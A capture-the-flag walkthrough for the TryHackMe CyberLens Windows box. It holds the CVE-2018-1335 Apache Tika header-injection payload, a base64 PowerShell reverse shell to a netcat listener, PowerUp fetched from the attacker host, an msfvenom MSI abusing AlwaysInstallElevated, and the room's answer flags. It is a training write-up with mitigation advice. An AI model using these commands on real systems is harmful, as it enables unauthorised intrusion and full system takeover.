# CyberLens CTF Walkthrough

**Target:** CyberLens  
**Source:** [TryHackMe](https://tryhackme.com/room/cyberlensp6)  
**Difficulty:** Easy  
**Target IP:** 10.114.157.165

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Apache Tika RCE](#apache-tika-rce)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

CyberLens is an easy-difficulty Windows box themed around metadata and digital
image forensics. The attack chain covers service enumeration that uncovers an
Apache Tika server running on a high port, identification of the outdated Tika
version (1.17) vulnerable to a header command-injection bug (CVE-2018-1335), an
RCE foothold as `cyberlens\cyberlens`, and a final privilege escalation to
`NT AUTHORITY\SYSTEM` by abusing the `AlwaysInstallElevated` registry policy
with a malicious MSI.

**Key Skills Required:**
- Network scanning and service enumeration
- Identifying hidden services on non-default ports
- Apache Tika version fingerprinting via the REST endpoint
- Command injection through crafted HTTP headers (CVE-2018-1335)
- PowerShell reverse-shell delivery
- Windows privilege escalation via `AlwaysInstallElevated` + msfvenom MSI

---

## Reconnaissance

### Host Setup

Add the target to `/etc/hosts` so the vhost resolves:

```bash
sudo echo 'Machine_ip cyberlens.thm' >> /etc/hosts
```

### Network Scanning

A quick default scan shows the common Windows surface:

```bash
nmap cyberlens.thm
```

**Results:**

| Port | Service |
|------|---------|
| 80/tcp | http |
| 135/tcp | msrpc |
| 139/tcp | netbios-ssn |
| 445/tcp | microsoft-ds |
| 3389/tcp | ms-wbt-server |
| 5985/tcp | wsman |

A full port scan with service/version detection reveals the real entry point —
an Apache Tika server hiding on a high port:

```bash
nmap -sV -sC -p- cyberlens.thm
```

**Key findings:**

| Port | Service | Version |
|------|---------|---------|
| 80/tcp | http | Apache httpd 2.4.57 (Win64) |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | microsoft-ds | SMB |
| 3389/tcp | ms-wbt-server | Microsoft Terminal Services |
| 5985/tcp | http | Microsoft HTTPAPI httpd 2.0 (WinRM) |
| 61777/tcp | http | Jetty 8.y.z-SNAPSHOT |

The HTTP title is `CyberLens: Unveiling the Hidden Matrix`. RDP NTLM info
confirms the host is named **CYBERLENS** running Windows 10.0.17763. The
interesting service is the **Jetty** server on port `61777`.

---

## Web Enumeration

### Identifying Apache Tika

Curling the Jetty service on port 61777 reveals it is an **Apache Tika** server
and, critically, leaks its version:

```bash
curl http://cyberlens.thm:61777
```

```
Apache Tika 1.17
For endpoints, please see https://wiki.apache.org/tika/TikaJAXRS
```

The endpoint listing exposes the full Tika JAX-RS REST API, including the
`PUT /meta` endpoint that the exploit abuses to inject commands.

> **Q — What is the name of the program running on the web server?** → `Apache Tika`  
> **Q — What is the version of the program?** → `1.17`

---

## Apache Tika RCE

### Finding the Exploit

Tika 1.17 falls inside the vulnerable range for the header command-injection
flaw. `searchsploit` confirms it:

```bash
searchsploit apache tika 1.17
```

```
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)  | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                    | windows/remote/46540.py
```

Copy the Python PoC to the working directory:

```bash
locate 46540.py
cp /usr/share/exploitdb/exploits/windows/remote/46540.py exploit.py
```

### How the Exploit Works

The PoC targets **CVE-2018-1335**. It abuses the `PUT /meta` endpoint by passing
attacker-controlled values in the `X-Tika-OCRTesseractPath` and
`X-Tika-OCRLanguage` headers, which Tika passes unsanitised to a shell. The
payload coerces Tika into running `cscript` against attacker-supplied JScript:

```python
headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
        "X-Tika-OCRLanguage": "//E:Jscript",
        "Expect": "100-continue",
        "Content-type": "image/jp2",
        "Connection": "close"}

jscript='''var oShell = WScript.CreateObject("WScript.Shell");
var oExec = oShell.Exec('cmd /c {}');
'''.format(cmd)
```

> **Note:** The PoC is written in Python 2 syntax (`print "..."`). Run it with a
> Python 2 interpreter, or port the `print` statements to Python 3 if needed.

### Generating the Reverse Shell

Use a tool like [revshells.com](https://www.revshells.com/) to generate a
base64-encoded PowerShell reverse shell. Start a listener first:

```bash
rlwrap nc -nvlp 443
```

Then fire the exploit, passing the encoded PowerShell one-liner as the command
to execute (replace the listener IP with your own tun0/VPN IP):

```bash
python3 exploit.py 10.114.157.165 61777 "powershell -e JABjAGwAaQBlAG4AdAAg...<snip base64>...AbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

A shell returns to the listener:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.157.165] 49867
PS C:\Windows\system32> whoami
cyberlens\cyberlens
```

### Grabbing the User Flag

```powershell
PS C:\Windows\system32> more C:\users\CyberLens\desktop\user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```

> **Q — What is the user flag?** → `THM{T1k4-CV3-f0r-7h3-w1n}`

---

## Privilege Escalation

### Enumerating with PowerUp

Check the foothold user's privileges first — they are minimal:

```powershell
PS C:\Windows\system32> whoami /priv
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

Serve PowerUp.ps1 from the attacker machine and pull it onto the target:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
python3 -m http.server --bind=192.168.132.9 8080
```

On the target:

```powershell
PS C:\Windows\system32> cd C:\users\Public
PS C:\users\Public> powershell iwr http://192.168.132.9:8080/PowerUp.ps1 -Outfile C:\users\Public\powerup.ps1
PS C:\users\Public> . .\powerup.ps1
PS C:\users\Public> Invoke-AllChecks
```

### AlwaysInstallElevated

PowerUp flags the `AlwaysInstallElevated` policy. Confirm it is enabled in
**both** the HKLM and HKCU hives — both `0x1` is required for the exploit:

```powershell
PS C:\users\Public> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\users\Public> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1
```

When this policy is set, any MSI installed via `msiexec` runs with `SYSTEM`
privileges — a textbook privilege escalation.

### Building a Malicious MSI

Generate an MSI carrying the same base64 PowerShell reverse shell with msfvenom:

```bash
msfvenom -p windows/exec CMD="powershell -e JABjAGwAaQBlAG4AdAAg...<snip base64>...AbgB0AC4AQwBsAG8AcwBlACgAKQA=" -f msi -o rs.msi
```

Transfer it to the target via the same Python HTTP server:

```powershell
PS C:\users\Public> powershell iwr http://192.168.132.9:8080/rs.msi -Outfile C:\users\Public\rs.msi
```

### Triggering the Elevated Install

Start a fresh listener:

```bash
rlwrap nc -nvlp 443
```

Then run the MSI silently on the target:

```powershell
PS C:\users\Public> msiexec /quiet /qn /i C:\users\Public\rs.msi
```

A new shell returns — this time as `SYSTEM`:

```
connect to [192.168.132.9] from (UNKNOWN) [10.114.157.165] 49983
PS C:\Windows\system32> whoami
nt authority\system
```

### Grabbing the Admin Flag

```powershell
PS C:\Windows\system32> more C:\users\Administrator\desktop\admin.txt
THM{3lev@t3D-4-pr1v35c!}
```

> **Q — What is the admin flag?** → `THM{3lev@t3D-4-pr1v35c!}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User Flag | `THM{T1k4-CV3-f0r-7h3-w1n}` | `C:\users\CyberLens\desktop\user.txt` |
| Admin Flag | `THM{3lev@t3D-4-pr1v35c!}` | `C:\users\Administrator\desktop\admin.txt` |

---

## Vulnerabilities

### 1. Sensitive Service Exposed on a High Port (Medium)

**Description:** An Apache Tika server was reachable on port `61777`, exposing
its full REST API and version banner to any unauthenticated client.

**Impact:** Immediate fingerprinting of a vulnerable software version.

**Mitigation:**
- Do not expose internal processing services to untrusted networks.
- Place such services behind authentication and a firewall / allowlist.

### 2. Apache Tika Header Command Injection (Critical)

**CVE:** CVE-2018-1335

**Description:** Apache Tika-server versions `< 1.18` pass attacker-controlled
HTTP header values (`X-Tika-OCRTesseractPath`, `X-Tika-OCRLanguage`) to a shell
when handling the `PUT /meta` endpoint, allowing remote command execution.

**Impact:** Unauthenticated RCE as `cyberlens\cyberlens`, providing the initial
foothold.

**Mitigation:**
- Upgrade Apache Tika to `1.18` or later.
- Run the service with the least privilege necessary.

### 3. AlwaysInstallElevated Policy Enabled (Critical)

**Description:** Both the `HKLM` and `HKCU` `AlwaysInstallElevated` registry
values were set to `0x1`, causing any MSI package installed through `msiexec`
to execute with `SYSTEM` privileges.

**Impact:** Full privilege escalation from a low-privileged user to
`NT AUTHORITY\SYSTEM`.

**Mitigation:**
- Disable the `AlwaysInstallElevated` policy in both registry hives.
- Audit Group Policy for unsafe installer configurations.

---

## Attack Chain Summary

```
Nmap scan → Windows host, Jetty server on port 61777
    ↓
curl :61777 → Apache Tika 1.17 (version leaked)
    ↓
searchsploit → CVE-2018-1335 header command injection (46540.py)
    ↓
exploit.py + base64 PowerShell payload → reverse shell as cyberlens\cyberlens
    ↓
user.txt → THM{T1k4-CV3-f0r-7h3-w1n}
    ↓
PowerUp / reg query → AlwaysInstallElevated = 0x1 (HKLM + HKCU)
    ↓
msfvenom → malicious rs.msi
    ↓
msiexec /quiet /qn /i rs.msi → reverse shell as NT AUTHORITY\SYSTEM
    ↓
admin.txt → THM{3lev@t3D-4-pr1v35c!}
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| curl | Banner grabbing / Tika version identification |
| searchsploit | Locating the CVE-2018-1335 PoC |
| exploit.py (46540.py) | Apache Tika header command-injection RCE |
| revshells.com | Generating the base64 PowerShell reverse shell |
| Netcat (rlwrap nc) | Reverse-shell listener |
| PowerUp.ps1 | Windows privilege-escalation enumeration |
| reg query | Confirming AlwaysInstallElevated policy |
| msfvenom | Building the malicious elevated MSI |
| msiexec | Triggering the elevated install |

---

## References

- [TryHackMe — CyberLens](https://tryhackme.com/room/cyberlensp6)
- [CVE-2018-1335 — Apache Tika header command injection](https://nvd.nist.gov/vuln/detail/CVE-2018-1335)
- [ExploitDB 46540 — Apache Tika-server Command Injection](https://www.exploit-db.com/exploits/46540)
- [Rhino Security Labs — Exploiting CVE-2018-1335](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/)
- [PowerUp.ps1 — PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
- [Nmap](https://nmap.org/)

---
